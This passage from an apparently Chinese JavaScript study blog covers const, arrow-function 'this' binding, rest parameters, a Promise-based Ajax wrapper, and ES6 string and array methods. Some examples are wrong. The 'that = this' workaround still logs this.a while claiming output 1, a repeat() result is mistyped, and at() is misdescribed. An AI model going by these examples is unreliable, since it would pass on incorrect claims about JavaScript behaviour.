<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo;</span><br><span class="line"><span class="comment">// SyntaxError: Missing initializer in const declaration</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>只在声明所在的块级作用域内有效</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> MAX = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAX <span class="comment">// Uncaught ReferenceError: MAX is not defined</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>不存在变量提升</p>
</li>
<li>只能先声明后使用</li>
<li>不允许重复声明</li>
<li><p>对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。即const命令只是保证变量名指向的地址不变，而不是保证数据不变，所以使用const声明为常量必须小心。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123;&#125;;</span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br><span class="line">foo.prop</span><br><span class="line"><span class="comment">// 123</span></span><br><span class="line">foo = &#123;&#125;; <span class="comment">// TypeError: "foo" is read-only</span></span><br></pre></td></tr></table></figure>
<p>常量foo存储的是一个地址，这个地址指向一个对象。所谓不可变的是这个地址，不能把foo指向另一个地址，但是该对象本身是可变的，可以为这个对象添加新属性等</p>
</li>
</ul>
<h3 id="箭头函数和普通函数的区别"><a href="#箭头函数和普通函数的区别" class="headerlink" title="箭头函数和普通函数的区别"></a>箭头函数和普通函数的区别</h3><blockquote>
<p>参考：<a href="https://www.jianshu.com/p/e5fe25edd78a" target="_blank" rel="noopener">简书 ES6箭头函数与普通函数的区别</a></p>
</blockquote>
<ul>
<li><p>this指向问题</p>
<p>1、普通函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a  = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>, <span class="keyword">this</span>.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj;</span><br><span class="line">bar.a = <span class="number">2</span>;</span><br><span class="line">bar.foo(); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = obj.foo;</span><br><span class="line">baz(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>
<p>1.）直接通过 <code>obj</code> 调用其中的方法 <code>foo</code>，此时，<code>this</code> 就会指向调用 <code>foo</code> 函数的对象，也就是 <code>obj</code>;<br>2.）将 <code>obj</code> 对象赋给一个新的对象 <code>bar</code>，此时通过 <code>bar</code> 调用 <code>foo</code> 函数，<code>this</code> 的值就会指向调用者 <code>bar</code>；<br>3.）将 <code>obj.foo</code> 赋给一个新对象 <code>baz</code>，通过 <code>baz()</code> 调用 <code>foo</code> 函数，此时的 <code>this</code> 指向 <code>window</code>；</p>
<p>由此我们可以得出结论：</p>
<p>普通函数的 <code>this</code> 总是指向它的直接调用者。<br>在严格模式下，没找到直接调用者，则函数中的 <code>this</code> 是 <code>undefined</code>。<br>在默认模式下（非严格模式），没找到直接调用者，则函数中的 <code>this</code> 指向 <code>window</code>。</p>
<p>再考虑一下以下的情况：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure>
<p>在上例中 <code>setTimeout</code> 中的 <code>function</code> 未被任何对象调用，因此它的 <code>this</code> 指向还是 <code>window</code> 对象。</p>
<p>对于方法（即通过对象调用了该函数），普通函数中的 <code>this</code> 总是指向它的调用者。<br>对于一般函数，<code>this</code> 指向全局变量（非严格模式下）或者 <code>undefined</code>（严格模式下）。</p>
<p>假设我么需要在上例中的 <code>setTimeout</code> 中使用 <code>this</code> 要怎么做呢，在 <code>es5</code> 的时代可以这样做：<br>1.）使用一个变量 <code>that</code> 先接收一遍 <code>this</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="keyword">this</span>; <span class="comment">// 先使用一个变量接收this</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>2.）使用 <code>bind</code> 给 <code>setTimeout</code> 绑定 <code>this</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;.bind(<span class="keyword">this</span>), <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>而 <code>es6</code> 可以如何实现这块呢，请继续往下看：</p>
<p>2、箭头函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() =&gt; &#123; <span class="built_in">console</span>.log(<span class="keyword">this</span>) &#125;</span><br></pre></td></tr></table></figure>
<p>箭头函数中没有自己的 <code>this</code>、<code>arguments</code>、<code>new target（ES6）</code>和 <code>super(ES6)</code>;<br>箭头函数相当于匿名函数，因此不能使用 <code>new</code> 来作为构造函数使用。<br>箭头函数中的 <code>this</code> 始终指向其父级作用域中的 <code>this</code>、 <code>call()</code>、 <code>bind()</code>、<code>apply()</code> 都无法改变 <code>this</code> 指向</p>
<p>请看如下代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">10</span>,</span><br><span class="line">  b: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  c: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  d: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">obj.b(); </span><br><span class="line">obj.c();</span><br><span class="line">obj.d()();</span><br></pre></td></tr></table></figure>
<p><code>obj.b()</code> 中的 <code>this</code> 会继承父级上下文中的 <code>this</code> 值，也就是与 <code>obj</code> 有相同的 <code>this</code> 指向，为全局变量 <code>window</code>;<br><code>obj.c()</code> 的 <code>this</code> 指向即为调用者 <code>obj</code>;<br><code>obj.d()()</code> 中的 <code>this</code> 也继承自父级上下文中的 <code>this</code>，即d的 <code>this</code> 指向，也就是 <code>obj</code>。</p>
</li>
</ul>
<ul>
<li><p>参数<br>1、示例</p>
<p>普通函数可以使用 <code>arguments</code> 来获取不定参数，输出的是一个数组，如</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>); <span class="comment">// output: Arguments(3) [1, 2, 3, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br><span class="line">&#125;</span><br><span class="line">funcA(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p><code>es6</code> 提供了 <code>rest</code> 方式来获取，即 <code>...</code> 符号，如：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcB = <span class="function">(<span class="params">...params</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: [1, 2, 3]</span></span><br><span class="line">&#125;</span><br><span class="line">funcB(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcC = <span class="function">(<span class="params">a, ...params</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: [2, 3]</span></span><br><span class="line">&#125;</span><br><span class="line">funcC(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcC = <span class="function">(<span class="params">a, ...params, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: Rest parameter must be last formal parameter</span></span><br><span class="line">&#125;</span><br><span class="line">funcC(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>2、区别：<br>1.） <code>arguments</code> 包含所有参数，<code>rest</code> 参数只包括那些没有给出名称的参数（前面的参数展示 <code>m</code> 个，<code>reset</code> 就占 <code>n - m</code> 个）<br>2.）<code>arguments</code> 对象不是真正的数组，而 <code>rest</code> 参数是数组实例，可以直接应用 <code>sort</code>、<code>map</code>、<code>forEach</code>、<code>pop</code>等方法<br>3.）将 <code>arguments</code> 转换成普通的数组</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funcD</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>); <span class="comment">// [1, 2, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// var args1 = Array.prototype.slice.call(arguments); // arguments调用Array的slice方法</span></span><br><span class="line">  <span class="keyword">var</span> args1 = [].slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> args2 = <span class="built_in">Array</span>.prototype.concat.apply([], <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(args1, args2); <span class="comment">// [1, 2]、[1, 2]</span></span><br><span class="line">&#125;</span><br><span class="line">funcD(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="使用Promise自己封装一个Ajax插件"><a href="#使用Promise自己封装一个Ajax插件" class="headerlink" title="使用Promise自己封装一个Ajax插件"></a>使用Promise自己封装一个Ajax插件</h3><p>我们知道 <code>Promise</code> 会接收两个参数，<code>resolve</code> (成功)和 <code>reject</code> (失败)，我们可以用这两个参数代替 <code>ajax</code> 的 <code>success</code> 和 <code>error</code>，并使用链式调用， <code>then</code> 里面执行成功的操作，<code>catch</code>里面执行错误的信息。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> $ajax = <span class="function"><span class="keyword">function</span>(<span class="params">url, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 XMLHttpRequest对象,用于在后台与服务器交换数据。</span></span><br><span class="line">        <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">            <span class="comment">//设置向服务器提交的方式</span></span><br><span class="line">        request.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>)</span><br><span class="line">        request.responseType = <span class="string">'json'</span></span><br><span class="line">        request.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        <span class="comment">// onreadystatechange捕获事件请求的状态</span></span><br><span class="line">        request.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="title">handlerRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//readyState为4的时候，代表请求操作已经完成，这意味着数据传输已经彻底完成或失败。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">//请求成功</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">                    resolve(<span class="keyword">this</span>.response)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="keyword">this</span>.statusText))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//发送 HTTP 请求,默认异步请求</span></span><br><span class="line">        request.send(data); <span class="comment">// data的格式: name1=value1&amp;name2=value2</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">$ajax(<span class="string">"http://www.phonegap100.com/appapi.php?a=getPortalList&amp;catid=20&amp;page=1"</span>, <span class="string">''</span>)</span><br><span class="line">    .then(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(resolve)</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(reject)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p>
<h3 id="常用的字符串方法"><a href="#常用的字符串方法" class="headerlink" title="常用的字符串方法"></a>常用的字符串方法</h3><ul>
<li><p>at(): 返回给定字符的位置</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.at(<span class="number">0</span>) <span class="comment">// H</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>includes(): 是否包含指定字符串，第二个参数可选，表示起始查找位置</p>
</li>
<li>startsWith(): 参数是否在头部，第二个参数可选，表示起始查找位置</li>
<li><p>endsWith(): 参数是否在尾部，第二个参数可选，表示起始查找位置</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'Hello'</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'!'</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'o'</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'world'</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'Hello'</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'Hello'</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>repeat(): 返回重复多次后的字符串</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello'</span></span><br><span class="line">s.repeat(<span class="number">3</span>)  <span class="comment">// HelloHelloHello</span></span><br><span class="line">s.repeat(<span class="number">2.9</span>) <span class="comment">// HelloHello，参数为小数时为取整次数</span></span><br><span class="line">s.repeat(<span class="literal">Infinity</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-1</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-0.8</span>) <span class="comment">// ""，-1~0取整后为0</span></span><br><span class="line">s.repeat(<span class="string">"2"</span>) <span class="comment">// HelloHell0，字符串先转换成数字再取整</span></span><br><span class="line">s.repeat(<span class="string">"world"</span>) <span class="comment">// ""</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>padStart(): 头部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p>
</li>
<li><p>padEnd(): 尾部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'ababx'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'abax'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'abcx' ，多余的会被去掉</span></span><br><span class="line">s.padEnd(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'xabab'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xaba'  </span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'xabc' ，多余的会被去掉</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'xxxx'</span></span><br><span class="line">s.padStart(<span class="number">2</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx'，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx' ，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">3</span>) <span class="comment">// '  x'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>) <span class="comment">//  'x   '</span></span><br><span class="line"></span><br><span class="line">常用来补全位数：</span><br><span class="line"><span class="string">'10'</span>.padStart(<span class="number">10</span>, <span class="string">'0'</span>) <span class="comment">// "0000000010"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>模板字符串</p>
</li>
</ul>
<h3 id="常用的数组方法"><a href="#常用的数组方法" class="headerlink" title="常用的数组方法"></a>常用的数组方法</h3><ul>
<li><p>Array.from()：将两类对象（类似数组的对象和可遍历的对象）转为真正的数组</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">  <span class="string">'0'</span>: <span class="string">'a'</span>,</span><br><span class="line">  <span class="string">'1'</span>: <span class="string">'b'</span>,</span><br><span class="line">  <span class="string">'2'</span>: <span class="string">'c'</span>,</span><br><span class="line">  length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法：</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法：</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// ['a', 'b', 'c']</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Array.of()：将一组值转换成数组</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of() <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="literal">undefined</span>) <span class="comment">// [undefined]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>copyWithin()：将指定位置的成员复制到其他位置（会覆盖原有成员），然后返回当前数组<br>Array.prototype.copyWithin(target, start = 0, end = this.length)</p>
<p>target（必需）：从该位置开始替换数据。</p>
<p>start（可选）：从该位置开始读取数据，默认为0。如果为负值，表示倒数。</p>
<p>end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示倒数。正从0开始，负从-1开始。</p>
<p>这三个参数都应该是数值，如果不是，会自动转为数值。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>)  <span class="comment">// [4, 5, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 从3号位直到数组结束的成员（4和5），复制到从0号位开始的位置，结果覆盖了原来的1和2</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">-2</span>, <span class="number">-1</span>) <span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"><span class="comment">// -2相当于3号位，-1相当于4号位</span></span><br><span class="line"></span><br><span class="line">[].copyWithin.call(&#123;<span class="attr">length</span>: <span class="number">5</span>, <span class="number">3</span>: <span class="number">1</span>&#125;, <span class="number">0</span>, <span class="number">3</span>) <span class="comment">// &#123;0: 1, 3: 1, length: 5&#125;</span></span><br><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i32a = <span class="keyword">new</span> <span class="built_in">Int32Array</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]); i32a.copyWithin(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// Int32Array [3, 4, 5, 4, 5]</span></span><br><span class="line"><span class="comment">// 将2号位到数组结束，复制到0号位</span></span><br><span 